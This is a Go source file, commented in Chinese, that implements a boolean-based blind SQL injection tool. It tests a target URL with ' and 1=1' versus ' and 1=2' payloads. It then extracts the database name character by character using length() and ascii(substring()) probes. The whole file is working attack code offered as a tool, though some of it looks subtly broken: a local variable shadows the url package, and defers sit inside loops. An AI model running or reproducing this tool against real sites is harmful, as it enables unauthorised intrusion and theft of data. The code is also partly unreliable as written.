package pkg

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// 布尔盲注检测
func checkBooleanInjection(host string) (int, error) {
	// 测试真条件
	truePayload := host + url.QueryEscape(" and 1=1")
	trueReq, err := http.Get(truePayload)
	if err != nil {
		return 0, err
	}
	defer trueReq.Body.Close()
	trueBody, _ := io.ReadAll(trueReq.Body)
	trueResponse := string(trueBody)
	
	// 测试假条件
	falsePayload := host + url.QueryEscape(" and 1=2")
	falseReq, err := http.Get(falsePayload)
	if err != nil {
		return 0, err
	}
	defer falseReq.Body.Close()
	falseBody, _ := io.ReadAll(falseReq.Body)
	falseResponse := string(falseBody)
	
	// 比较响应差异
	if trueReq.StatusCode == 200 && falseReq.StatusCode == 200 {
		if len(trueResponse) != len(falseResponse) || !strings.EqualFold(trueResponse, falseResponse) {
			fmt.Println("Boolean-based SQL injection detected!")
			fmt.Printf("True condition response length: %d\n", len(trueResponse))
			fmt.Printf("False condition response length: %d\n", len(falseResponse))
			return 1, nil
		}
	}
	
	return 0, nil
}

// 布尔盲注数据提取
func BooleanInject(host string) error {
	fmt.Println("Starting Boolean-based blind SQL injection...")
	
	// 获取数据库名长度
	dbNameLength, err := getDatabaseNameLength(host)
	if err != nil {
		return err
	}
	fmt.Printf("Database name length: %d\n", dbNameLength)
	
	// 获取数据库名
	dbName, err := getDatabaseName(host, dbNameLength)
	if err != nil {
		return err
	}
	fmt.Printf("Database name: %s\n", dbName)
	
	return nil
}

// 获取数据库名长度
func getDatabaseNameLength(host string) (int, error) {
	for i := 1; i <= 50; i++ {
		payload := fmt.Sprintf(" and length(database())=%d", i)
		url := host + url.QueryEscape(payload)
		
		req, err := http.Get(url)
		if err != nil {
			return 0, err
		}
		defer req.Body.Close()
		
		body, _ := io.ReadAll(req.Body)
		response := string(body)
		
		// 检查响应是否表示真条件
		if isTrueCondition(response, host) {
			return i, nil
		}
	}
	return 0, fmt.Errorf("could not determine database name length")
}

// 获取数据库名
func getDatabaseName(host string, length int) (string, error) {
	dbName := ""
	
	for i := 1; i <= length; i++ {
		for j := 32; j <= 126; j++ { // ASCII可打印字符
			payload := fmt.Sprintf(" and ascii(substring(database(),%d,1))=%d", i, j)
			url := host + url.QueryEscape(payload)
			
			req, err := http.Get(url)
			if err != nil {
				return "", err
			}
			defer req.Body.Close()
			
			body, _ := io.ReadAll(req.Body)
			response := string(body)
			
			if isTrueCondition(response, host) {
				dbName += string(rune(j))
				fmt.Printf("Found character %d: %c\n", i, rune(j))
				break
			}
		}
	}
	
	return dbName, nil
}

// 判断是否为真条件响应
func isTrueCondition(response, host string) bool {
	// 获取正常响应的基准
	normalReq, err := http.Get(host)
	if err != nil {
		return false
	}
	defer normalReq.Body.Close()
	normalBody, _ := io.ReadAll(normalReq.Body)
	normalResponse := string(normalBody)
	
	// 简单的响应比较逻辑
	return len(response) == len(normalResponse) && response == normalResponse
}
